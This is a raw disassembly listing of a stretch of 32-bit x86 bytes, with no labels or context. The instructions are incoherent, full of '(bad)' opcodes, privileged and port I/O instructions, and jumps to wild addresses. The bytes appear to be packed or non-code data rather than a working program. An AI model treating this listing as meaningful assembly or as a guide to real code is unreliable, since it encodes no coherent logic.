  41e41e:	add    BYTE PTR [ebx],bh
  41e420:	dec    eax
  41e421:	push   0xb0bcc401
  41e426:	dec    esi
  41e427:	loopne 0x41e3b2
  41e429:	sbb    BYTE PTR [edi],ch
  41e42b:	(bad)  
  41e42c:	xor    DWORD PTR [eax+0x4d],esi
  41e42f:	add    al,0x8b
  41e431:	dec    edx
  41e432:	stos   DWORD PTR es:[edi],eax
  41e433:	and    eax,ebx
  41e435:	dec    eax
  41e436:	sbb    al,0x3f
  41e438:	pusha  
  41e439:	jle    0x41e472
  41e43b:	in     eax,0xbe
  41e43d:	or     DWORD PTR [edx],esi
  41e43f:	(bad)  
  41e440:	cs push esp
  41e442:	imul   esp,DWORD PTR gs:[ebx+ecx*2+0x2d623a3b],0xffffff92
  41e44b:	and    bh,BYTE PTR [edi+0xc]
  41e44e:	ins    DWORD PTR es:[edi],dx
  41e44f:	jg     0x41e4b2
  41e451:	loope  0x41e3f0
  41e453:	or     ah,BYTE PTR [edi]
  41e455:	or     bh,bh
  41e457:	or     BYTE PTR [ebx],al
  41e459:	enter  0xbcd1,0x70
  41e45d:	mov    ebx,0xb046c79b
  41e462:	push   ebp
  41e463:	shl    BYTE PTR [edx+0x6],cl
  41e466:	and    ecx,edi
  41e468:	mov    bh,0xd3
  41e46a:	mov    dh,0xc9
  41e46c:	es int 0xbf
  41e46f:	jge    0x41e480
  41e471:	pop    ss
  41e472:	mov    DWORD PTR [edi+0x68],esp
  41e475:	pop    edx
  41e476:	push   0xf90a79bf
  41e47b:	sub    cl,BYTE PTR [ebx]
  41e47d:	pop    edi
  41e47e:	jbe    0x41e428
  41e480:	sub    eax,ebx
  41e482:	sub    al,BYTE PTR [ecx-0x69]
  41e485:	imul   esi,DWORD PTR [ebx+0x2fd8ec84],0xdec3fcdb
  41e48f:	inc    edx
  41e490:	iret   
  41e491:	inc    edi
  41e492:	ja     0x41e4b6
  41e494:	mov    dl,BYTE PTR [ebx+esi*1-0x1]
  41e498:	and    edx,0x332c70f0
  41e49e:	adc    DWORD PTR ds:0x48c603bb,0xb5809583
  41e4a8:	(bad)  
  41e4a9:	out    0x99,eax
  41e4ab:	int    0x30
  41e4ad:	mov    eax,ds:0x24735200
  41e4b2:	push   ds
  41e4b3:	mov    ecx,DWORD PTR [esp+edi*2-0x3974eedf]
  41e4ba:	ret    
  41e4bb:	push   cs
  41e4bc:	jl     0x41e4be
  41e4be:	cmp    eax,0xf9b77736
  41e4c3:	outs   dx,DWORD PTR ds:[esi]
  41e4c4:	push   eax
  41e4c5:	inc    ebx
  41e4c6:	xchg   ebx,eax
  41e4c7:	jl     0x41e483
  41e4c9:	sub    eax,0x272d5322
  41e4ce:	push   eax
  41e4cf:	lods   eax,DWORD PTR ds:[esi]
  41e4d0:	loopne 0x41e4e7
  41e4d2:	outs   dx,DWORD PTR ds:[esi]
  41e4d3:	mov    al,0x3e
  41e4d5:	inc    edi
  41e4d6:	shr    DWORD PTR [ecx+0xf95ffa1],1
  41e4dc:	xchg   ebp,eax
  41e4dd:	xor    al,0xc3
  41e4df:	mov    DWORD PTR [ebp+edi*4-0x25183f61],esi
  41e4e6:	test   dh,dh
  41e4e8:	dec    ebp
  41e4e9:	dec    edi
  41e4ea:	shl    BYTE PTR [ebx+0x27],0x47
  41e4ee:	popf   
  41e4ef:	lds    eax,FWORD PTR [edi-0x227f7c81]
  41e4f5:	push   es
  41e4f6:	mov    esi,DWORD PTR [esp]
  41e4f9:	sub    esi,edi
  41e4fb:	loopne 0x41e555
  41e4fd:	pop    edx
  41e4fe:	pop    es
  41e4ff:	mov    BYTE PTR [edx-0x1],bl
  41e502:	clc    
  41e503:	or     bl,BYTE PTR [eax+0x1be850e2]
  41e509:	in     eax,dx
  41e50a:	xchg   ecx,eax
  41e50b:	cmp    BYTE PTR [ebp+0x34],0x7
  41e50f:	loopne 0x41e51b
  41e511:	aam    0x91
  41e513:	mov    ebx,0xe81a8922
  41e518:	into   
  41e519:	stos   DWORD PTR es:[edi],eax
  41e51a:	aas    
  41e51b:	and    BYTE PTR [eax+0x653d4ac6],al
  41e521:	rcr    BYTE PTR [eax-0x80],1
  41e524:	sbb    esp,DWORD PTR [eax-0x29]
  41e527:	pop    edi
  41e528:	stos   DWORD PTR es:[edi],eax
  41e529:	mov    al,0xf8
  41e52b:	sub    esp,DWORD PTR [esp+edi*2+0x17]
  41e52f:	js     0x41e545
  41e531:	(bad)  
  41e532:	aad    0x21
  41e534:	fwait
  41e535:	and    eax,0x88bf6af
  41e53a:	push   ss
  41e53b:	sti    
  41e53c:	add    dh,BYTE PTR [ecx+ebx*1-0x34]
  41e540:	push   esi
  41e541:	pop    DWORD PTR [esi+0x46]
  41e544:	cmp    edi,DWORD PTR [eax]
  41e546:	push   ebx
  41e547:	clc    
  41e548:	xor    BYTE PTR [edx],dh
  41e54a:	dec    edi
  41e54b:	or     ch,0xee
  41e54e:	push   ds
  41e54f:	inc    edx
  41e550:	add    al,0x88
  41e552:	or     BYTE PTR [ebx-0x7a4841a5],cl
  41e558:	outs   dx,DWORD PTR ds:[esi]
  41e559:	mov    ebx,cr5
  41e55c:	lds    ebx,FWORD PTR [edi+0x76f23bd0]
  41e562:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e563:	mov    cl,BYTE PTR [esi]
  41e565:	cs push cs
  41e567:	inc    ebp
  41e568:	int    0x7b
  41e56a:	pop    edi
  41e56b:	or     edi,eax
  41e56d:	add    al,0x5c
  41e56f:	sub    eax,0x619a061a
  41e574:	jo     0x41e5ac
  41e576:	push   ds
  41e577:	lahf   
  41e578:	sub    al,0x3d
  41e57a:	mov    esi,0xcf650a1d
  41e57f:	add    dl,dl
  41e581:	sbb    BYTE PTR ds:0x1a3c07cc,bl
  41e587:	imul   eax,DWORD PTR [ebx-0xa],0x19ea0ae8
  41e58e:	fisub  DWORD PTR [eax-0x6a]
  41e591:	bswap  ecx
  41e593:	aas    
  41e594:	add    al,0x18
  41e596:	push   ss
  41e597:	imul   eax,esp,0xffffffe1
  41e59a:	daa    
  41e59b:	dec    edx
  41e59c:	and    BYTE PTR [edi],ah
  41e59e:	hlt    
  41e59f:	mov    edx,DWORD PTR [edi]
  41e5a1:	sub    edx,esi
  41e5a3:	xor    eax,edi
  41e5a5:	leave  
  41e5a6:	mov    bl,0x42
  41e5a8:	loopne 0x41e5c2
  41e5aa:	je     0x41e5ae
  41e5ac:	nop
  41e5ad:	pop    es
  41e5ae:	add    cl,BYTE PTR [edi+eax*1+0x20]
  41e5b2:	adc    eax,0xd9753b42
  41e5b7:	sbb    bl,BYTE PTR [edx-0x29]
  41e5ba:	mov    ecx,0x1e0873e4
  41e5bf:	hlt    
  41e5c0:	fsubr  QWORD PTR [edi+0x99c01f9]
  41e5c6:	cmovp  edi,DWORD PTR [eax+0x30]
  41e5ca:	and    cl,BYTE PTR [edi+0x1f0aeff5]
  41e5d0:	hlt    
  41e5d1:	xor    DWORD PTR [eax],edi
  41e5d3:	mov    edx,eax
  41e5d5:	pop    eax
  41e5d6:	sub    eax,0x873c95d8
  41e5db:	or     DWORD PTR [ecx],eax
  41e5dd:	jecxz  0x41e58e
  41e5df:	hlt    
  41e5e0:	dec    ebp
  41e5e1:	loopne 0x41e56b
  41e5e3:	mov    al,ds:0xf7c77d9f
  41e5e8:	pop    es
  41e5e9:	pop    esi
  41e5ea:	sub    ah,ch
  41e5ec:	push   edi
  41e5ed:	mov    eax,ds:0x749f8938
  41e5f2:	fwait
  41e5f3:	inc    eax
  41e5f4:	sub    ch,bh
  41e5f6:	call   FWORD PTR [edi]
  41e5f8:	add    al,0x36
  41e5fa:	aaa    
  41e5fb:	push   es
  41e5fc:	mov    bl,BYTE PTR [edi+esi*1+0x7]
  41e600:	sub    bl,al
  41e602:	jb     0x41e61e
  41e604:	inc    ebx
  41e605:	mov    BYTE PTR [ebp-0x1],al
  41e608:	mov    al,BYTE PTR [ebp+0x2]
  41e60b:	fisubr WORD PTR [esi]
  41e60d:	ja     0x41e640
  41e60f:	stos   DWORD PTR es:[edi],eax
  41e610:	(bad)  
  41e611:	sbb    al,0xfe
  41e613:	retf   
  41e614:	jne    0x41e600
  41e616:	shl    BYTE PTR [esi-0x9],cl
  41e619:	add    eax,0xcfe838c
  41e61e:	jge    0x41e62a
  41e620:	pop    ebx
  41e621:	or     al,BYTE PTR [ebp+esi*2-0x38]
  41e625:	mov    edi,0xdb5f53fe
  41e62a:	xchg   edi,eax
  41e62b:	clc    
  41e62c:	pop    ds
  41e62d:	ja     0x41e636
  41e62f:	nop
  41e630:	cld    
  41e631:	push   edx
  41e632:	push   eax
  41e633:	mov    BYTE PTR [esi],0x36
  41e636:	setb   bh
  41e639:	fisub  DWORD PTR [edx+0x6417d95b]
  41e63f:	inc    bh
  41e641:	add    eax,0x12b409ed
  41e646:	cmp    al,0x58
  41e648:	out    0xa9,eax
  41e64a:	push   esp
  41e64b:	add    BYTE PTR [eax+0x1],al
  41e64e:	adc    bh,0x1d
  41e651:	retf   0x8c75
  41e654:	mov    ds:0x1b12664b,eax
  41e659:	enter  0x8b70,0x8c
  41e65d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e65e:	inc    dx
  41e660:	add    ecx,DWORD PTR [esi-0x77]
  41e663:	adc    eax,0xbddd0961
  41e668:	push   ecx
  41e669:	mov    al,ds:0xa30ae8c1
  41e66e:	arpl   WORD PTR [esi+0x1b78b1bc],di
  41e674:	fadd   DWORD PTR [eax-0x7a]
  41e677:	xor    DWORD PTR [ecx+0x385d8708],edi
  41e67d:	sti    
  41e67e:	and    esi,DWORD PTR ds:0xad850f02
  41e684:	xchg   edi,eax
  41e685:	mov    al,ds:0x3f134648
  41e68a:	sub    ch,cl
  41e68c:	jmp    0xdb86ec57
  41e691:	or     al,0x44
  41e693:	sub    BYTE PTR [ecx-0x45ffaa4f],ah
  41e699:	out    dx,al
  41e69a:	push   es
  41e69b:	out    dx,eax
  41e69c:	call   0xbab99efa
  41e6a1:	mov    esi,DWORD PTR [ecx-0x42c11e0a]
  41e6a7:	mov    al,ds:0x8856241d
  41e6ac:	sbb    eax,0x6f0c224d
  41e6b1:	iret   
  41e6b2:	rol    BYTE PTR [esi-0x21],cl
  41e6b5:	popa   
  41e6b6:	mov    eax,0x8958da1
  41e6bb:	mov    BYTE PTR [ebx+0x2f06f70],dl
  41e6c1:	inc    eax
  41e6c2:	inc    edx
  41e6c3:	cmp    eax,0x8df5755b
  41e6c8:	test   DWORD PTR [ecx],esp
  41e6ca:	(bad)  
  41e6cb:	shl    DWORD PTR ds:0x6610be9a,1
  41e6d1:	sub    BYTE PTR [eax-0x13],ch
  41e6d4:	mov    dh,0xf
  41e6d6:	setg   BYTE PTR [esi+0x2]
  41e6da:	mov    ebx,0x77a0b1
  41e6df:	fmul   QWORD PTR [ebx]
  41e6e1:	out    dx,al
  41e6e2:	inc    ebx
  41e6e3:	cmp    WORD PTR [edx],0x3a
  41e6e7:	xchg   esp,eax
  41e6e8:	ror    DWORD PTR [eax+0x15fdb20d],0x6
  41e6ef:	mov    esi,0x483236e6
  41e6f4:	jne    0x41e6df
  41e6f6:	jmp    0x41e726
  41e6f8:	push   0x4a
  41e6fa:	mov    ebp,gs
  41e6fc:	push   esi
  41e6fd:	pop    esi
  41e6fe:	pop    edx
  41e6ff:	dec    ebx
  41e700:	enter  0xa2c0,0x39
  41e704:	push   0x2a
  41e706:	and    DWORD PTR ds:0x2514c160,ebp
  41e70c:	pop    es
  41e70d:	outs   dx,DWORD PTR ds:[esi]
  41e70e:	ja     0x14dc259
  41e714:	out    dx,al
  41e715:	xor    DWORD PTR [ecx+0x4],edi
  41e718:	cld    
  41e719:	dec    eax
  41e71a:	pusha  
  41e71b:	dec    ecx
  41e71c:	jne    0x41e717
  41e71e:	push   ebx
  41e71f:	and    BYTE PTR [edi+0x7c02d0b4],0x27
  41e726:	mov    al,ds:0x188b0860
  41e72b:	sbb    eax,0xf62e396b
  41e730:	test   DWORD PTR [eax+esi*8-0xc95bf9],ecx
  41e737:	xchg   esi,eax
  41e738:	xor    ecx,esi
  41e73a:	xor    ecx,ecx
  41e73c:	mov    edx,0x5587d914
  41e741:	lock mov eax,0x415a4600
  41e747:	adc    ch,BYTE PTR [ebp+0x0]
  41e74a:	pop    ebx
  41e74b:	sti    
  41e74c:	jp     0x41e73b
  41e74e:	mov    esp,0x431bba98
  41e753:	sub    BYTE PTR [ebp+ebp*4-0x5dd0d660],ah
  41e75a:	push   esp
  41e75b:	inc    esi
  41e75c:	call   0xe44828a2
  41e761:	sbb    al,0xe8
  41e763:	jb     0x41e75c
  41e765:	mov    cl,0x5f
  41e767:	mov    WORD PTR [ecx+0x390fba2c],?
  41e76d:	mov    ah,0xa2
  41e76f:	jle    0x41e796
  41e771:	cs mov edx,0xf272030e
  41e777:	pop    ebp
  41e778:	jg     0x41e70d
  41e77a:	in     al,0x19
  41e77c:	in     al,0x72
  41e77e:	leave  
  41e77f:	frstor [eax]
  41e781:	sub    BYTE PTR [ebp+0x2f],0xba
  41e785:	sbb    eax,0x95203481
  41e78a:	out    0xdc,al
  41e78c:	enter  0xdc1f,0x49
  41e790:	outs   dx,BYTE PTR ds:[esi]
  41e791:	push   ds
  41e792:	sub    BYTE PTR [eax-0x1f5f725e],ah
  41e798:	mov    eax,0xa9019a84
  41e79d:	mov    ah,0xd4
  41e79f:	pop    eax
  41e7a0:	fsub   DWORD PTR [eax]
  41e7a2:	aam    0xd8
  41e7a4:	scas   al,BYTE PTR es:[edi]
  41e7a5:	jge    0x41e737
  41e7a7:	dec    edi
  41e7a8:	fdivr  DWORD PTR [eax-0x45c54e78]
  41e7ae:	push   ds
  41e7af:	(bad)  [ebx+eax*1-0x2fa25abd]
  41e7b6:	jle    0x41e7a8
  41e7b8:	sub    BYTE PTR [edi-0x30],ah
  41e7bb:	and    BYTE PTR [ebp-0x6f4736ca],dl
  41e7c1:	int3   
  41e7c2:	inc    edx
  41e7c3:	cld    
  41e7c4:	sub    DWORD PTR [edx],edi
  41e7c6:	adc    al,0x92
  41e7c8:	cmp    al,0xcc
  41e7ca:	mov    eax,0x2720fb94
  41e7cf:	add    eax,0xc8ee85a1
  41e7d4:	and    eax,0x326b5099
  41e7d9:	enter  0xb43e,0xb0
  41e7dd:	add    ecx,ebx
  41e7df:	mov    bl,0x8
  41e7e1:	mov    ch,0x14
  41e7e3:	sbb    eax,0xc936c47c
  41e7e8:	sbb    BYTE PTR [ebx+eiz*1+0x7c23fc4],0x72
  41e7f0:	leave  
  41e7f1:	xchg   ebx,eax
  41e7f2:	rol    BYTE PTR ds:0xe3f4c010,0x20
  41e7f9:	bswap  eax
  41e7fb:	mov    edx,0x30baf820
  41e800:	push   DWORD PTR [ebp+0x42]
  41e803:	fsubr  st,st(6)
  41e805:	es inc esi
  41e807:	cld    
  41e808:	push   0xf40e1e40
  41e80d:	mov    eax,0xc005edc9
  41e812:	stos   BYTE PTR es:[edi],al
  41e813:	fnsave [eax]
  41e815:	add    al,0x39
  41e817:	dec    esp
  41e818:	cs mov ecx,0xf09cc818
  41e81e:	or     al,0x46
  41e820:	cld    
  41e821:	sbb    al,0x46
  41e823:	lea    eax,[edx]
  41e825:	adc    eax,0xbac0b4ae
  41e82a:	adc    BYTE PTR [edx-0x127a5c5b],bh
  41e830:	lahf   
  41e831:	fild   DWORD PTR [eax]
  41e833:	mov    esp,0x2f6d0619
  41e838:	fs das 
  41e83a:	aaa    
  41e83b:	scas   eax,DWORD PTR es:[edi]
  41e83c:	mov    ecx,0x6dafe006
  41e841:	add    BYTE PTR [eax],ah
  41e843:	fs sub al,0x20
  41e846:	pop    DWORD PTR [edx]
  41e848:	pop    edx
  41e849:	aaa    
  41e84a:	cdq    
  41e84b:	mov    dh,0x61
  41e84d:	ins    DWORD PTR es:[edi],dx
  41e84e:	pop    ss
  41e84f:	jo     0x41e7e8
  41e851:	push   0x51c2d47
  41e856:	cmc    
  41e857:	push   0x15200768
  41e85c:	inc    edx
  41e85d:	aaa    
  41e85e:	test   BYTE PTR [ecx-0x50dfe2e1],0x7c
  41e865:	(bad)  
  41e866:	jl     0x41e89e
  41e868:	cmp    cl,ah
  41e86a:	pop    ss
  41e86b:	push   es
  41e86c:	cmp    dh,BYTE PTR [ebx+0x73]
  41e86f:	ss and eax,0x1b0b4fe0
  41e875:	add    edi,ecx
  41e877:	ss stc 
  41e879:	or     DWORD PTR [edx+ecx*1],ebx
  41e87c:	(bad)  
  41e87d:	in     al,dx
  41e87e:	jp     0x41e86c
  41e880:	mov    ch,0xa2
  41e882:	test   BYTE PTR [esi+0x37a7682e],0x89
  41e889:	xor    edx,DWORD PTR ds:0xc032a0c8
  41e88f:	out    dx,al
  41e890:	in     al,dx
  41e891:	mov    DWORD PTR [edi+eiz*1],ebx
  41e894:	rol    BYTE PTR [edx+edi*1-0x30],1
  41e898:	es cld 
  41e89a:	dec    ebp
  41e89b:	adc    eax,0x6abf51d9
  41e8a0:	add    DWORD PTR [ebx-0x24a837f3],ecx
  41e8a6:	je     0x41e910
  41e8a8:	int    0x1
  41e8aa:	fstp   DWORD PTR [edx]
  41e8ac:	or     al,0x14
  41e8ae:	sub    ch,BYTE PTR [eax+ebx*2]
  41e8b1:	xchg   edx,eax
  41e8b2:	lock mov DWORD PTR [esi],ecx
  41e8b5:	pop    es
  41e8b6:	mov    esp,0x8b0c5af4
  41e8bb:	ret    0x1f45
  41e8be:	repz mov ch,0xa5
  41e8c1:	invlpg BYTE PTR [ecx-0x14]
  41e8c5:	mov    DWORD PTR [ebx+0x51],edx
  41e8c8:	mov    dl,0xad
  41e8ca:	sbb    al,0x1b
  41e8cc:	jecxz  0x41e873
  41e8ce:	pop    eax
  41e8cf:	lock stos BYTE PTR es:[edi],al
  41e8d1:	or     DWORD PTR [esp+ebx*8],ebx
  41e8d4:	aas    
  41e8d5:	mov    ebx,0xf46a5300
  41e8da:	int3   
  41e8db:	add    eax,DWORD PTR [ecx+0x301388b1]
  41e8e1:	cwde   
  41e8e2:	iret   
  41e8e3:	data16 loopne 0x41e8e9
  41e8e6:	push   ecx
  41e8e7:	push   es
  41e8e8:	push   eax
  41e8e9:	sbb    eax,eax
  41e8eb:	in     eax,0xcb
  41e8ed:	sar    ebp,0x9
  41e8f0:	pop    es
  41e8f1:	push   0x86e8b66c
  41e8f6:	mov    bl,ah
  41e8f8:	or     eax,0x7ccc6ba8
  41e8fd:	push   ds
  41e8fe:	or     DWORD PTR [eax-0x56aed75d],edx
  41e904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e905:	fwait
  41e906:	jnp    0x41e94c
  41e908:	or     ebx,DWORD PTR [edx+ecx*1-0x48]
  41e90c:	lock sar BYTE PTR [edi],1
  41e90f:	and    BYTE PTR [eax+esi*8],ah
  41e912:	and    eax,0x6944675b
  41e917:	jae    0x41e984
  41e919:	adc    BYTE PTR [ebx],bl
  41e91b:	dec    eax
  41e91c:	cld    
  41e91d:	inc    esi
  41e91e:	jb     0x41e985
  41e920:	gs push ebx
  41e922:	jo     0x41e98c
  41e924:	inc    ebp
  41e925:	js     0x41e8f6
  41e927:	loope  0x41e948
  41e929:	jl     0x41e900
  41e92b:	cwde   
  41e92c:	xadd   DWORD PTR [edx],eax
  41e92f:	inc    eax
  41e930:	ret    
  41e931:	mov    edx,0x7bc217b1
  41e936:	xor    al,0x48
  41e939:	ret    
  41e93a:	xchg   DWORD PTR [eax],edx
  41e93c:	dec    edi
  41e93d:	sbb    eax,0xca8c281d
  41e942:	out    0x15,eax
  41e944:	mov    BYTE PTR [edx-0x3c],cl
  41e947:	imul   eax,DWORD PTR [ebx],0x4e
  41e94a:	lea    esi,[ebp+eiz*1+0x62]
  41e94e:	mov    ch,0xd0
  41e950:	mov    eax,ds:0x9f445408
  41e955:	icebp  
  41e956:	sub    bl,ah
  41e958:	sar    DWORD PTR [esi],0xea
  41e95b:	push   cs
  41e95c:	stos   DWORD PTR es:[edi],eax
  41e95d:	inc    ebp
  41e95e:	add    BYTE PTR [ecx],ah
  41e960:	and    DWORD PTR [ebp-0x66ef7cec],0x5ac5ed88
  41e96a:	stos   BYTE PTR es:[edi],al
  41e96b:	not    BYTE PTR [eax]
  41e96d:	jne    0x41e940
  41e96f:	mov    bh,BYTE PTR [edx-0x80]
  41e972:	loop   0x41e9cf
  41e974:	jmp    0x80b0:0x21bb1fc2
  41e97b:	call   0xeff8:0x5b54c17e
  41e982:	and    al,0x64
  41e984:	(bad)  
  41e985:	push   ecx
  41e986:	mov    ecx,0xa142dbe1
  41e98b:	dec    eax
  41e98c:	in     al,dx
  41e98d:	dec    BYTE PTR [edx-0xbacdfc]
  41e993:	and    al,0xf
  41e995:	pusha  
  41e996:	test   eax,0x27de108c
  41e99b:	mov    al,ds:0x446b7f0c
  41e9a0:	pop    esi
  41e9a1:	jg     0x41e94a
  41e9a3:	and    BYTE PTR [esi],ah
  41e9a5:	or     ebp,DWORD PTR [esp+ebx*1]
  41e9a8:	icebp  
  41e9a9:	pop    ecx
  41e9aa:	push   eax
  41e9ab:	mov    esi,0xc0838644
  41e9b0:	outs   dx,BYTE PTR ds:[esi]
  41e9b1:	or     edx,edx
  41e9b3:	jmp    0x41e9bb
  41e9b5:	pop    ss
  41e9b6:	mov    esi,0xb6c7b1b9
  41e9bb:	adc    al,0x3b
  41e9bd:	push   0x1aee7504
  41e9c2:	pop    ss
  41e9c3:	std    
  41e9c4:	test   ecx,ebx
  41e9c6:	inc    ecx
  41e9c7:	fdiv   QWORD PTR gs:[edi]
  41e9ca:	xor    edi,DWORD PTR [eax-0x15f8a41f]
  41e9d0:	data16 fimul WORD PTR [ecx+ecx*4]
  41e9d4:	dec    edx
  41e9d5:	mov    DWORD PTR [eax],ecx
  41e9d7:	mov    DWORD PTR [eax+0x8],0xa74ecf28
  41e9de:	js     0x41ea5c
  41e9e0:	pop    ss
  41e9e1:	pushf  
  41e9e2:	mov    eax,ds:0xa648168d
  41e9e7:	test   BYTE PTR [eax+0x42],dh
  41e9ea:	mov    esp,0xc80224a4
  41e9ef:	xor    edx,ecx
  41e9f1:	and    al,0x95
  41e9f3:	shr    DWORD PTR [ecx-0x3fa3fd9a],1
  41e9f9:	adc    BYTE PTR [ebx-0x4dfd1f30],bh
  41e9ff:	push   eax
  41ea00:	or     BYTE PTR [esi-0x7e],bl
  41ea03:	loopne 0x41e9c8
  41ea05:	fwait
  41ea06:	popf   
  41ea07:	mov    bh,0x34
  41ea09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea0a:	ret    
  41ea0b:	imul   esi,DWORD PTR [eax+0x33833e99],0xab99e30
  41ea15:	add    edi,DWORD PTR [esi-0x275e3e46]
  41ea1b:	cmp    ebx,0xec13f813
  41ea21:	sbb    DWORD PTR [esp+ecx*1-0x7d],esi
  41ea25:	push   ss
  41ea26:	mov    DWORD PTR [edx+0x4],eax
  41ea29:	jmp    0x41ea36
  41ea2b:	imul   ecx,DWORD PTR [eax+0x18bd718c],0x2f
  41ea32:	mov    ah,0xc6
  41ea34:	or     al,BYTE PTR [eax+0x7d241f7]
  41ea3a:	mov    eax,es
  41ea3c:	pop    ds
  41ea3d:	xchg   ecx,eax
  41ea3e:	and    DWORD PTR [eax-0x1cfdb939],edx
  41ea44:	sub    ebp,eax
  41ea46:	aas    
  41ea47:	scas   al,BYTE PTR es:[edi]
  41ea48:	inc    DWORD PTR [edx]
  41ea4a:	inc    edi
  41ea4b:	or     BYTE PTR [ecx-0x6cdeefba],cl
  41ea51:	sub    al,0xda
  41ea53:	mov    cl,0x1f
  41ea55:	adc    al,0x4c
  41ea57:	sbb    BYTE PTR [edi+0x66b000c6],dh
  41ea5d:	retf   0x7269
  41ea60:	sub    ah,BYTE PTR [eax]
  41ea62:	xchg   BYTE PTR [ebp-0x2e545f35],ah
  41ea68:	(bad)  
  41ea69:	mov    bh,0xd9
  41ea6b:	jl     0x41ea9b
  41ea6d:	sub    eax,0xa9d53e0a
  41ea72:	jbe    0x41ea47
  41ea74:	ins    DWORD PTR es:[edi],dx
  41ea75:	(bad)  
  41ea76:	mov    eax,DWORD PTR [ebx-0x3b35dc4c]
  41ea7c:	fst    DWORD PTR [eax]
  41ea7e:	adc    al,0x20
  41ea80:	pop    eax
  41ea81:	cs int3 
  41ea83:	dec    ecx
  41ea84:	inc    ecx
  41ea85:	mov    ds:0xae5cc69c,al
  41ea8a:	std    
  41ea8b:	data16 aas 
  41ea8d:	inc    eax
  41ea8e:	push   ebx
  41ea8f:	dec    edx
  41ea90:	fcom   DWORD PTR [edi]
  41ea92:	call   0xdc1aceab
  41ea97:	xchg   ebx,eax
  41ea98:	push   eax
  41ea99:	sbb    BYTE PTR [edx+0x37],dl
  41ea9c:	dec    ebx
  41ea9d:	add    BYTE PTR [edi],bl
  41ea9f:	adc    al,0x9e
  41eaa1:	loope  0x41ea3e
  41eaa3:	xor    DWORD PTR [edi],edx
  41eaa5:	call   0xf890ec5d
  41eaaa:	cmp    edi,DWORD PTR [ebp-0x2f]
  41eaad:	mov    eax,0x84203b18
  41eab2:	test   bh,ah
  41eab4:	test   al,0xc0
  41eab6:	popa   
  41eab7:	sbb    BYTE PTR [ebx-0x6712d7ee],ah
  41eabd:	jle    0x41ead1
  41eabf:	mov    cl,0xd8
  41eac1:	or     eax,0x704c38a7
  41eac6:	seta   bl
  41eac9:	fdivr  QWORD PTR [ebx]
  41eacb:	test   al,0xe
  41eacd:	les    esp,FWORD PTR [edx+eiz*1]
  41ead0:	shl    DWORD PTR [esi+0x121aeb8c],0x2a
  41ead7:	pop    ds
  41ead8:	or     al,0x3c
  41eada:	cld    
  41eadb:	add    dl,cl
  41eadd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eade:	lods   al,BYTE PTR ds:[esi]
  41eadf:	pop    es
  41eae0:	mov    ebx,0x85fdcccf
  41eae5:	test   eax,0x360e3320
  41eaea:	xor    edi,DWORD PTR ds:0xcbd27547
  41eaf0:	sti    
  41eaf1:	in     al,0x6d
  41eaf3:	mov    ebx,0x89980884
  41eaf8:	jge    0x41ea94
  41eafa:	sub    BYTE PTR [edx+0x48dfeba3],bh
  41eb00:	cmp    esp,esp
  41eb02:	sete   bl
  41eb05:	inc    DWORD PTR [ebp-0x7a]
  41eb08:	ret    
  41eb09:	and    DWORD PTR [eax+0x60e47f6],edx
  41eb0f:	xchg   BYTE PTR [ebx+eax*2],cl
  41eb12:	dec    DWORD PTR [ebx+0x1c]
  41eb15:	cmp    DWORD PTR [ebx+0x1c],0xffffff92
  41eb19:	xor    DWORD PTR [ebp+0x43b80a27],0x16f94370
  41eb23:	cld    
  41eb24:	inc    eax
  41eb25:	mov    ecx,0xa86bedc3
  41eb2a:	clc    
  41eb2b:	pop    edi
  41eb2c:	mov    dh,0x40
  41eb2e:	(bad)
  41eb32:	int3   
  41eb33:	pop    edx
  41eb34:	cpuid  
  41eb36:	es clc 
  41eb38:	nop
  41eb39:	cmp    eax,0xffffffb0
  41eb3c:	inc    edi
  41eb3d:	inc    DWORD PTR [eax+0xc]
  41eb40:	mov    ebp,0xff858301
  41eb45:	jo     0x41eb68
  41eb47:	cmp    eax,DWORD PTR [edi+0x24]
  41eb4a:	je     0x41eb8c
  41eb4c:	mov    cs,WORD PTR [ecx+0x3c53ff04]
  41eb52:	xchg   ecx,eax
  41eb53:	test   eax,0x8d27eb10
  41eb58:	inc    edi
  41eb59:	jecxz  0x41eb13
  41eb5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb5c:	add    DWORD PTR [ebx],0x4a
  41eb5f:	xchg   edi,eax
  41eb60:	(bad)  
  41eb61:	ficom  WORD PTR [ebp+0x27fedb70]
  41eb67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb68:	push   eax
  41eb69:	push   ecx
  41eb6a:	dec    ebp
  41eb6b:	cwde   
  41eb6c:	mov    cl,BYTE PTR [eax]
  41eb6e:	jbe    0x41eb1b
  41eb70:	pusha  
  41eb71:	int    0x5a
  41eb73:	jg     0x41eb50
  41eb75:	dec    eax
  41eb76:	or     al,0x39
  41eb78:	and    DWORD PTR [esi-0x6a],0x64
  41eb7c:	dec    eax
  41eb7d:	in     eax,dx
  41eb7e:	inc    ebx
  41eb7f:	xor    al,0xa8
  41eb81:	call   0xd3a9828b
  41eb86:	enter  0xf981,0x9
  41eb8a:	mov    bl,0xeb
  41eb8c:	sbb    DWORD PTR [ecx],ebp
  41eb8e:	mov    ecx,DWORD PTR [eax-0xbeac3da]
  41eb94:	(bad)  
  41eb95:	(bad)  
  41eb96:	(bad)  
  41eb98:	(bad)  
  41eb99:	add    eax,0x2a350782
  41eb9e:	adc    BYTE PTR [esi],bh
  41eba0:	pop    esp
  41eba1:	and    BYTE PTR [esi+0x6e],cl
  41eba4:	push   0x69
  41eba6:	push   eax
  41eba7:	mov    WORD PTR [edi],gs
  41eba9:	sub    al,0xc6
  41ebab:	xchg   esp,eax
  41ebac:	clc    
  41ebad:	test   BYTE PTR [ecx+esi*4-0x9e50c32],ch
  41ebb4:	lock push cs
  41ebb6:	dec    esp
  41ebb7:	call   0x7a2989f2
  41ebbc:	fsubrp st(0),st
  41ebbe:	cs rcr al,1
  41ebc1:	in     al,0xd0
  41ebc3:	in     al,dx
  41ebc4:	repz cmp al,0xcf
  41ebc7:	jnp    0x41eb91
  41ebc9:	push   ds
  41ebca:	cmp    al,al
  41ebcc:	je     0x41eb86
  41ebce:	cmp    al,0xef
  41ebd0:	jns    0x41eba1
  41ebd2:	pop    eax
  41ebd3:	mov    al,0xe
  41ebd5:	jo     0x41eb7f
  41ebd7:	push   ds
